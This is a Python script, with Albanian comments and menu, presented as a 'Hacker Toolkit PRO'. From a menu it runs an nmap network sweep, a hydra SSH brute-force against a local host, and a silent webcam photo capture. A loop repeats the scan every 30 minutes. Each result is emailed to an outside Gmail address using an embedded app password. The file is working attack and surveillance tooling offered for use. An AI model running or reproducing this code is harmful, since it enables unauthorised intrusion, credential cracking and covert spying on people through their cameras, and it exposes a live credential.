import os
import time
import smtplib
import cv2
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Funksioni për të dërguar file në email
def send_email_with_attachment(file_path, subject="Raport"):
    msg = MIMEMultipart()
    msg["From"] = "emriyt@gmail.com"
    msg["To"] = "evikaja31@gmail.com"
    msg["Subject"] = subject

    part = MIMEBase("application", "octet-stream")
    with open(file_path, "rb") as f:
        part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
    msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login("emriyt@gmail.com", "zmfuccqzwtkvgnez")
    server.sendmail("emriyt@gmail.com", "evikaja31@gmail.com", msg.as_string())
    server.quit()

# Kap foto me kamerën
def capture_photo():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        filename = "photo.jpg"
        cv2.imwrite(filename, frame)
        cam.release()
        cv2.destroyAllWindows()
        send_email_with_attachment(filename, "Foto e kapur nga kamera")
        os.remove(filename)
    else:
        print("Nuk mund të kapet foto")

# Funksionet ekzistuese
def auto_scan():
    os.system("nmap -sn 192.168.1.0/24 > scan.txt")
    send_email_with_attachment("scan.txt", "Rezultati i skanimit")

def ssh_bruteforce():
    os.system("hydra -L users.txt -P pass.txt ssh://192.168.1.100 -o ssh_result.txt")
    send_email_with_attachment("ssh_result.txt", "Rezultati i bruteforce")

def auto_report():
    while True:
        auto_scan()
        time.sleep(1800)

# Menuja kryesore
def menu():
    while True:
        os.system("clear")
        print("""[ Hacker Toolkit PRO ]

1. Auto-skanim i rrjetit me Nmap
2. SSH Brute-force me Hydra
3. Kap foto me kamerën dhe dërgo në email
4. Dërgo raport automatik çdo 30 minuta
5. Dil
""")
        choice = input("Zgjedhja jote: ")

        if choice == '1':
            auto_scan()
        elif choice == '2':
            ssh_bruteforce()
        elif choice == '3':
            capture_photo()
        elif choice == '4':
            auto_report()
        elif choice == '5':
            print("Duke dalë...")
            break
        else:
            input("Zgjedhje e pavlefshme! Shtyp ENTER...")

menu()
